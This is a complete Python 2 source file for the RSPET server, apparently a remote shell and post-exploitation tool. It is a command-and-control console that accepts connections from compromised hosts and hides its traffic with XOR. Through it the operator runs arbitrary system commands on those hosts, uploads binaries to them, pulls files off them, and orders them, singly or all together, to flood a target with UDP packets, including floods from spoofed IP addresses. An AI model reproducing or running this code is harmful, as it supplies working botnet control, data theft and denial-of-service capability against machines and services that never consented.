#!/usr/bin/env python2
# -*- coding: <UTF-8> -*-
from __future__ import print_function

"""rspet_server.py: RSPET's Server-side script."""
__author__ = "Kolokotronis Panagiotis"
__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
__license__ = "MIT"
__version__ = "0.1.0"
__maintainer__ = "Kolokotronis Panagiotis"

from sys import exit as sysexit
from sys import argv
from thread import start_new_thread
from threading import Thread
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as sock_error
import tab


def conn_accept(sock, f_handler):
    """Listen for connection, usually invocted in parallel.

    Keyword argument(s):
    sock      -- The socket to listen on
    f_handler -- instance of ClientHandler class
    """
    while True:
        (client, (cl_ip, port)) = sock.accept()
        f_decode = recv_comm(1024, client)
        f_decode = f_decode.split("-")
        client_version = f_decode[0]
        client_type = f_decode[1]
        f_handler.add_host(client, (cl_ip, port), (client_version, client_type))


def send_comm(f_command, f_cur_host_con):
    """Obfuscate (xor) and send command, return integer.

    Keyword argument(s):
    f_command      -- command to be sent (string)
    f_cur_host_con -- socket object
    """
    encode = bytearray(f_command)
    for k in range(len(encode)):
        encode[k] = encode[k]^0x41
    try:
        f_cur_host_con.send(encode)
        return 0
    except sock_error:
        return 1


def get_len(in_string, max_len):
    """Calculate string length, return as a string with trailing 0s.

    Keyword argument(s):
    in_string -- input string
    max_len   -- length of returned string
    """
    tmp_str = str(len(in_string))
    len_to_return = tmp_str
    for _ in range(max_len - len(tmp_str)):
        len_to_return = '0' + len_to_return
    return len_to_return


def recv_comm(recv_size, f_cur_host_con):
    """Receive data, deobfuscate (xor) them, return string.

    Keyword argument(s):
    recv_size      -- size to receive, passed as argument to .recv()
    f_cur_host_con -- socket object
    """
    en_data = f_cur_host_con.recv(recv_size)
    f_decode = bytearray(en_data)
    for k in range(len(f_decode)):
        f_decode[k] = f_decode[k]^0x41
    return f_decode


def print_hosts(f_active_hosts, f_list_of_selected_hosts):
    """Check if selected host is active, print details.

    Keyword argument(s):
    f_active_hosts           -- list of active hosts
    f_list_of_selected_hosts -- list of currently selected hosts
    """
    for f_host_id in f_list_of_selected_hosts:
        if f_active_hosts[f_host_id] is None:
            continue
        current_host_ip = f_active_hosts[f_host_id][1][0]
        current_host_port = f_active_hosts[f_host_id][1][1]
        current_host_version = f_active_hosts[f_host_id][2][0]
        current_host_type = f_active_hosts[f_host_id][2][1]
        print ("["+str(f_host_id)+"] "+current_host_ip+":"+str(current_host_port)
               +"\t"+current_host_version+"-"+current_host_type)
    return 0


def udp_flood(target, f_cur_host_con, f_cur_host_id, f_handler):
    """Command host to Flood target with UDP packets.

    Keyword argument(s):
    target         -- Target's IP and port (list)
    f_cur_host_con -- socket object
    f_cur_host_id  -- Host's ID in ClientHandler's instance
    f_handler      -- instance of ClientHandler class
    """
    target_ip = target[0]
    target_port = target[1]
    try:
        payload = target[2]
    except IndexError:
        payload = "Hi"
    f_res = send_comm(CC['udpFlood'], f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    to_send = target_ip+":"+str(target_port)+":"+payload
    size_to_send = get_len(to_send, 3)
    f_res = send_comm(size_to_send, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    f_res = send_comm(to_send, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    return 0


def udp_spoof(name_set, f_cur_host_con, f_cur_host_id, f_handler):
    """Command host to Flood target with UDP packets using spoofed IP.

    Keyword argument(s):
    name_set       -- [target IP, target port, spoofed IP, spoofed port]
    f_cur_host_con -- socket object
    f_cur_host_id  -- Host's ID in ClientHandler's instance
    f_handler      -- instance of ClientHandler class
    """
    target_ip = name_set[0]
    target_port = name_set[1]
    spoofed_ip = name_set[2]
    spoofed_port = name_set[3]
    try:
        payload = name_set[4]
    except IndexError:
        payload = 'Hi'
    f_res = send_comm(CC['udpSpoof'], f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    to_send = target_ip+":"+str(target_port)+":"+spoofed_ip+":"+str(spoofed_port)+":"+payload
    size_to_send = get_len(to_send, 3)
    f_res = send_comm(size_to_send, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    f_res = send_comm(to_send, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    return 0


def make_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
    """Execute remote inclusion of file at host.

    Keyword argument(s):
    name_set       -- [local file name, remote file name (optional)]
    f_cur_host_con -- socket object
    f_cur_host_id  -- Host's ID in ClientHandler's instance
    f_handler      -- instance of ClientHandler class
    """
    return_code = 0
    file_to_read = name_set[0]
    try:
        remote_file_name = name_set[1]
    except IndexError:
        remote_file_name = file_to_read
    f_res = send_comm(CC['getFile'], f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    fname_size = get_len(remote_file_name, 3)
    f_res = send_comm(fname_size, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    f_res = send_comm(remote_file_name, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    f_decode = recv_comm(3, f_cur_host_con)
    if f_decode == "fna":
        return_code = 2
    else:
        try:
            file_to_read = open(file_to_read, 'r')
        except IOError:
            return_code = 3
        else:
            f_command = file_to_read.read()
            file_to_read.close()
            f_size = get_len(f_command, 13)
            f_res = send_comm(f_size, f_cur_host_con)
            if f_res == 1:
                f_handler.remove_host(f_cur_host_id)
                return 1
            f_res = send_comm(f_command, f_cur_host_con)
            if f_res == 1:
                f_handler.remove_host(f_cur_host_id)
                return 1
            f_decode = recv_comm(3, f_cur_host_con)
    return return_code


def make_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
    """Execute remote inclusion of binary at host.

    Keyword argument(s):
    name_set       -- [local binary name, remote binary name (optional)]
    f_cur_host_con -- socket object
    f_cur_host_id  -- Host's ID in ClientHandler's instance
    f_handler      -- instance of ClientHandler class
    """
    return_code = 0
    bin_to_read = name_set[0]
    try:
        remote_bin_name = name_set[1]
    except IndexError:
        remote_bin_name = bin_to_read
    f_res = send_comm(CC['getBinary'], f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    bname_size = get_len(remote_bin_name, 3)
    f_res = send_comm(bname_size, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    f_res = send_comm(remote_bin_name, f_cur_host_con)
    if f_res == 1:
        f_handler.remove_host(f_cur_host_id)
        return 1
    f_decode = recv_comm(3, f_cur_host_con)
    if f_decode == "fna":
        return_code = 2
    else:
        try:
            bin_to_read = open(bin_to_read, 'rb')
        except IOError:
            return_code = 3
        else:
            f_command = bin_to_read.read()
            bin_to_read.close()
            b_size = get_len(f_command, 13)
            f_res = send_comm(b_size, f_cur_host_con)
            if f_res == 1:
                f_handler.remove_host(f_cur_host_id)
                return 1
            f_res = send_comm(f_command, f_cur_host_con)
            if f_res == 1:
                f_handler.remove_host(f_cur_host_id)
                return 1
            f_decode = recv_comm(3, f_cur_host_con)
    return return_code


def pull_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
    """Remotely pull file from host.

    Keyword argument(s):
    name_set       -- [remote file name, local file name (optional)]
    f_cur_host_con -- socket object
    f_cur_host_id  -- Host's ID in ClientHandler's instance
    f_handler      -- instance of ClientHandler class
    """
    return_code = 0
    try:
        remote_file_name = name_set[0]
    except IndexError:
        print ("Remote file name not provided")
        return_code = 2
    else:
        try:
            local_file_name = name_set[1]
        except IndexError:
            local_file_name = remote_file_name
        f_res = send_comm(CC['sendFile'], f_cur_host_con)
        if f_res == 1:
            f_handler.remove_host(f_cur_host_id)
            return 1
        fname_size = get_len(remote_file_name, 3)
        f_res = send_comm(fname_size, f_cur_host_con)
        if f_res == 1:
            f_handler.remove_host(f_cur_host_id)
            return 1
        f_res = send_comm(remote_file_name, f_cur_host_con)
        if f_res == 1:
            f_handler.remove_host(f_cur_host_id)
            return 1
        f_decode = recv_comm(3, f_cur_host_con)
        if f_decode == 'fna':
            print ("File does not exist or Access Denied")
            return_code = 2
        else:
            try:
                local_file = open(local_file_name, 'w')
            except IOError:
                print ("Cannot create local file")
                return_code = 2
            else:
                f_decode = recv_comm(13, f_cur_host_con)
                f_decode = recv_comm(int(f_decode), f_cur_host_con)
                local_file.write(f_decode)
                local_file.close()
    return return_code


def pull_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
    """Remotely pull binary from host.

    Keyword argument(s):
    name_set       -- [remote binary name, local binary name (optional)]
    f_cur_host_con -- socket object
    f_cur_host_id  -- Host's ID in ClientHandler's instance
    f_handler      -- instance of ClientHandler class
    """
    return_code = 0
    try:
        remote_bin_name = name_set[0]
    except IndexError:
        print ("Remote binary name not provided")
        return_code = 2
    else:
        try:
            local_bin_name = name_set[1]
        except IndexError:
            local_bin_name = remote_bin_name
        f_res = send_comm(CC['sendBinary'], f_cur_host_con)
        if f_res == 1:
            f_handler.remove_host(f_cur_host_id)
            return 1
        bname_size = get_len(remote_bin_name, 3)
        f_res = send_comm(bname_size, f_cur_host_con)
        if f_res == 1:
            print ("Connection closed by client")
            f_handler.remove_host(f_cur_host_id)
            return 1
        f_res = send_comm(remote_bin_name, f_cur_host_con)
        if f_res == 1:
            print ("Connection closed by client")
            f_handler.remove_host(f_cur_host_id)
            return 1
        f_decode = recv_comm(3, f_cur_host_con)
        if f_decode == 'fna':
            print ("File does not exist or Access Denied")
            return_code = 2
        else:
            try:
                local_bin = open(local_bin_name, 'wb')
            except IOError:
                print ("Cannot create local file")
                return_code = 2
            else:
                f_decode = recv_comm(13, f_cur_host_con)
                f_decode = recv_comm(int(f_decode), f_cur_host_con)
                local_bin.write(f_decode)
                local_bin.close()
    return return_code


def multihost_calls(func_ref, args_list, f_handler, f_list_of_selected_hosts):
    """Call local function for multiple hosts.

    Keyword argument(s):
    func_ref                 -- function to call
    args_list                -- list of arguments to pass
    f_cur_host_con           -- socket object
    f_cur_host_id            -- Host's ID in ClientHandler's instance
    f_handler                -- instance of ClientHandler class
    f_list_of_selected_hosts -- list of hosts to call func_ref on
    """
    f_jobs = []
    f_active_hosts = f_handler.return_list_of_hosts()
    for f_host_at_hand in f_list_of_selected_hosts:
        if f_active_hosts[f_host_at_hand] is None:
            continue
        f_args_to_pass = [args_list, f_active_hosts[f_host_at_hand][0], f_host_at_hand, f_handler]
        thr = Thread(target=func_ref, args=f_args_to_pass)
        f_jobs.append(thr)
    if not f_jobs:
        print("All the selected hosts have closed their connections")
        print("Exiting to main interface ...")
        return 1
    for k in f_jobs:
        k.start()
    for k in f_jobs:
        k.join()
    return 0


def list_root_commands(handler=None, command=None):
    """Print List of Server Commands."""
    print ("List of Server Commands")
    print ("$List_Commands -> Display this list")
    print ("$List_Hosts -> Display connected hosts")
    print ("$Choose_Host host_no -> Select host from list")
    print ("$Select (commaSeperatedHostIDs) -> Select specified hosts")
    print ("$ALL -> Select all hosts and display available commands")
    print ("$Exit -> Exit this program")


def list_connected_commands():
    """Print List of Commands when Host is Selected."""
    print ("List of Commands when Host is Selected")
    print ("$List_Commands -> Display this list")
    print ("$Make_File local_file_name (remote_file_name)-> Create remote file")
    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
    print ("$Pull_File remote_file_name (local_file_name)-> Get remote file")
    print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
    print ("$UDP_Flood targetIP targetPort (msg) -> Selected Host floods target")
    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
    print ("$KILL -> All selected Hosts stop current perpetual task")
    print ("$Close_Connection -> Close Connection and remove host")
    print ("$Exit -> Exit to the main interface")


def list_connected_mult_commands():
    """Print List of Commands when ALL Host are Selected."""
    print ("List of Commands when ALL Host are Selected")
    print ("$List_Commands -> Display this list")
    print ("$List_Sel_Hosts -> Display selected hosts")
    print ("$Make_File local_file_name (remote_file_name)-> Create remote file")
    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
    print ("$UDP_Flood targetIP targetPort (msg) -> All selected Hosts flood target")
    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
    print ("$KILL -> All selected Hosts stop current perpetual task")
    print ("$Close_Connection -> close connection with and remove all selected hosts")
    print ("$Exit -> Exit to the main interface")


def make_logo():
    """Print logo and Authorship/Licence."""
    logo = []
    logo.append(r"#####################################################")
    logo.append(r"__________  _________________________________________")
    logo.append(r"\______   \/   _____/\______   \_   _____/\__    ___/")
    logo.append(r" |       _/\_____  \  |     ___/|    __)_   |    |   ")
    logo.append(r" |    |   \/        \ |    |    |        \  |    |   ")
    logo.append(r" |____|_  /_______  / |____|   /_______  /  |____|   ")
    logo.append(r"        \/        \/                   \/            ")
    logo.append(r"")
    logo.append(r"-Author: panagiks (http://panagiks.xyz) -Licence: MIT")
    logo.append(r"#####################################################")
    logo.append(r"")
    for line in logo:
        print(line)


def system_comm(command, cur_host_con):
    """Send a command to be executed directly at client's OS, print output.

    Keyword argument(s):
    command      -- command to be sent (list)
    cur_host_con -- socket object
    """
    com_reconst = command
    command = ''
    command = " ".join(com_reconst)
    res = send_comm(CC['command'], cur_host_con)
    if res == 1:
        print ("Connection closed by client")
        return 1
    len_command = get_len(command, 13)
    res = send_comm(len_command, cur_host_con)
    if res == 1:
        print ("Connection closed by client")
        return 1
    res = send_comm(command, cur_host_con)
    if res == 1:
        print ("Connection closed by client")
        return 1
    decode = recv_comm(13, cur_host_con)
    decode = recv_comm(int(decode), cur_host_con)
    print (decode)
    return 0


def list_hosts(handler, command):
    """Send a command to be executed directly at client's OS, print output.

    Keyword argument(s):
    handler -- instance of ClientHandler class
    command -- IGNORED/INCLUDED FOR UNIFORMITY
    """
    active_hosts = handler.return_list_of_hosts()
    list_of_selected_hosts = []
    for i in range(len(active_hosts)):
        list_of_selected_hosts.append(i)
    print_hosts(active_hosts, list_of_selected_hosts)
    return 0


def close_connection(handler, list_of_selected_hosts):
    """Send a command to be executed directly at client's OS, print output.

    Keyword argument(s):
    handler                -- instance of ClientHandler class
    list_of_selected_hosts -- list of hosts to close connection on
    """
    active_hosts = handler.return_list_of_hosts()
    for j in range(len(list_of_selected_hosts)-1, -1, -1):
        host_at_hand = list_of_selected_hosts[j]
        if active_hosts[host_at_hand] is None:
            continue
        send_comm(CC['killMe'], active_hosts[host_at_hand][0])
        active_hosts[host_at_hand][0].close()
        handler.remove_host(host_at_hand)
    return 0


def choose_host(handler, command):
    """Command Interface for single host.

    Keyword argument(s):
    handler -- instance of ClientHandler class
    command -- host to select (list)
    """
    try:
        cur_host_id = int(command[1])
    except (IndexError, ValueError):
        print ("Argument missing or not int")
        return 1
    active_hosts = handler.return_list_of_hosts()
    try:
        cur_host_ip = active_hosts[cur_host_id][1][0]
        cur_host_con = active_hosts[cur_host_id][0]
    except IndexError:
        print ("Host ID out of bounds")
        return 1
    list_connected_commands()
    while True:
        command = raw_input("["+cur_host_ip+"]~$ ")
        if not command:
            continue
        command = command.split(" ")
        comm_body = command[0]
        try:
            comm_trans = CONN_COMMAND_DICT[comm_body]
            if comm_trans == 0: #List_Commands
                list_connected_commands()
            elif comm_trans == 1: #KILL
                res = send_comm(CC['KILL'], cur_host_con)
                if res == 1:
                    print("Current host has closed its connection")
                    print("Exiting to main interface ...")
                    break
            elif comm_trans == 2: #Close_Connection
                close_connection(handler, [cur_host_id])
                break
            elif comm_trans == 3: #Exit
                break
        except KeyError:
            try:
                func_to_call = CONN_COMMAND_FUNC_DICT[comm_body]
                args_to_pass = command[1:]
                func_to_call(args_to_pass, cur_host_con, cur_host_id, handler)
            except KeyError:
                system_comm(command, cur_host_con)
    return 0


def select_hosts(handler, command):
    """Command Interface for multiple hosts.

    Keyword argument(s):
    handler -- instance of ClientHandler class
    command -- hosts to select (list)
    """
    list_of_selected_hosts = []
    try:
        hosts_string = command[1]
        hosts_string = hosts_string.split(",")
        for host_id in hosts_string:
            list_of_selected_hosts.append(int(host_id.replace(" ", "")))
    except (IndexError, ValueError):
        print ("No host IDs provided or Host IDs not integers")
        return 1
    list_connected_mult_commands()
    while True:
        command = raw_input("[MULTIPLE]~$ ")
        command = command.split(" ")
        comm_body = command[0]
        try:
            comm_trans = CONN_MUL_COMMAND_DICT[comm_body]
            if comm_trans == 0: #List_Commands
                list_connected_commands()
            elif comm_trans == 1: #List_Sel_Hosts
                active_hosts = handler.return_list_of_hosts()
                print_hosts(active_hosts, list_of_selected_hosts)
            elif comm_trans == 2: #KILL
                active_hosts = handler.return_list_of_hosts()
                for host_at_hand in list_of_selected_hosts:
                    if active_hosts[host_at_hand] is None:
                        continue
                    send_comm(CC['KILL'], active_hosts[host_at_hand][0])
            elif comm_trans == 3: #Close_Connection
                close_connection(handler, list_of_selected_hosts)
                break
            elif comm_trans == 4: #Exit
                break
        except KeyError:
            try:
                func_to_call = CONN_MUL_COMMAND_FUNC_DICT[comm_body]
                args_to_pass = command[1:]
                active_hosts = handler.return_list_of_hosts()
                multihost_calls(func_to_call, args_to_pass, handler, list_of_selected_hosts)
            except KeyError:
                print ("Command not recognised")
    return 0


def all_hosts(handler, command):
    """Command Interface for all hosts.

    Keyword argument(s):
    handler -- instance of ClientHandler class
    command -- IGNORED/INCLUDED FOR UNIFORMITY (list)
    """
    active_hosts = handler.return_list_of_hosts()
    list_of_selected_hosts = []
    for host_id in range(len(active_hosts)):
        list_of_selected_hosts.append(host_id)
    list_connected_mult_commands()
    while True:
        command = raw_input("[ALL]~$ ")
        command = command.split(" ")
        comm_body = command[0]
        try:
            comm_trans = CONN_MUL_COMMAND_DICT[comm_body]
            if comm_trans == 0: #List_Commands
                list_connected_commands()
            elif comm_trans == 1: #List_Sel_Hosts
                active_hosts = handler.return_list_of_hosts()
                print_hosts(active_hosts, list_of_selected_hosts)
            elif comm_trans == 2: #KILL
                active_hosts = handler.return_list_of_hosts()
                for host_at_hand in list_of_selected_hosts:
                    if active_hosts[host_at_hand] is None:
                        continue
                    send_comm(CC['KILL'], active_hosts[host_at_hand][0])
            elif comm_trans == 3: #Close_Connection
                close_connection(handler, list_of_selected_hosts)
                break
            elif comm_trans == 4: #Exit
                break
        except KeyError:
            try:
                func_to_call = CONN_MUL_COMMAND_FUNC_DICT[comm_body]
                args_to_pass = command[1:]
                active_hosts = handler.return_list_of_hosts()
                multihost_calls(func_to_call, args_to_pass, handler, list_of_selected_hosts)
            except KeyError:
                print ("Command not recognised")
    return 0


class ClientHandler(object):
    """Class to handle client connections."""

    list_of_hosts = []
    def __init__(self):
        """Initialize list_of_hosts list."""
        self.list_of_hosts = []

    def add_host(self, host, ip_port_tup, ver_type_tup):
        """Add new host to list_of_hosts.

        Keyword argument(s):
        host         -- socket object
        ip_port_tup  -- tuple of host's IP and Port
        ver_type_tup -- tuple of client version and type
        """
        self.list_of_hosts.append([host, ip_port_tup, ver_type_tup])

    def remove_host(self, f_host_id):
        """Remove host from list_of_hosts.

        Keyword argument(s):
        f_host_id -- ID of host to remove
        """
        self.list_of_hosts[f_host_id] = None

    def rebuild(self):
        """Rebuild list_of_hosts, remove 'None' entries."""
        tmp_list = [a for a in self.list_of_hosts if a is not None]
        self.list_of_hosts = tmp_list

    def return_list_of_hosts(self):
        """Return list_of_hosts"""
        return self.list_of_hosts


CC = {
    'killMe'     : '00000',
    'getFile'    : '00001',
    'getBinary'  : '00002',
    'sendFile'   : '00003',
    'sendBinary' : '00004',
    'udpFlood'   : '00005',
    'udpSpoof'   : '00006',
    'command'    : '00007',
    'KILL'       : '00008'
}

ROOT_COMMAND_DICT = {
    "List_Commands" : list_root_commands,
    "List_Hosts"    : list_hosts,
    "Choose_Host"   : choose_host,
    "Select"        : select_hosts,
    "ALL"           : all_hosts
}

CONN_COMMAND_FUNC_DICT = {
    "Make_File"        : make_file,
    "Make_Binary"      : make_binary,
    "Pull_File"        : pull_file,
    "Pull_Binary"      : pull_binary,
    "UDP_Flood"        : udp_flood,
    "UDP_Spoof"        : udp_spoof
}

CONN_MUL_COMMAND_FUNC_DICT = {
    "Make_File"        : make_file,
    "Make_Binary"      : make_binary,
    "UDP_Flood"        : udp_flood,
    "UDP_Spoof"        : udp_spoof
}

CONN_COMMAND_DICT = {
    "List_Commands"    : 0,
    "KILL"             : 1,
    "Close_Connection" : 2,
    "Exit"             : 3
}

CONN_MUL_COMMAND_DICT = {
    "List_Commands"    : 0,
    "List_Sel_Hosts"   : 1,
    "KILL"             : 2,
    "Close_Connection" : 3,
    "Exit"             : 4
}


def main():
    """Script's main block"""
    make_logo()
    try:
        max_conns = int(argv[1])
    except IndexError:
        max_conns = 5
    sock = socket(AF_INET, SOCK_STREAM)
    sock.bind(("0.0.0.0", 9000))
    sock.listen(max_conns)
    handler = ClientHandler()
    start_new_thread(conn_accept, (sock, handler))
    list_root_commands()
    while True:
        handler.rebuild()
        comm_body = ""
        comm_args = []
        command = raw_input("~$ ")
        command = command.split(" ")
        comm_body = command[0]
        for i in range(1, len(command)):
            comm_args.append(command[i])
        try:
            ROOT_COMMAND_DICT[comm_body](handler, command)
        except KeyError:
            if comm_body == "Exit":
                sock.close()
                sysexit()
            print ("Command not recognised! Try List_Commands for help")
            continue

if __name__ == '__main__':
    main()
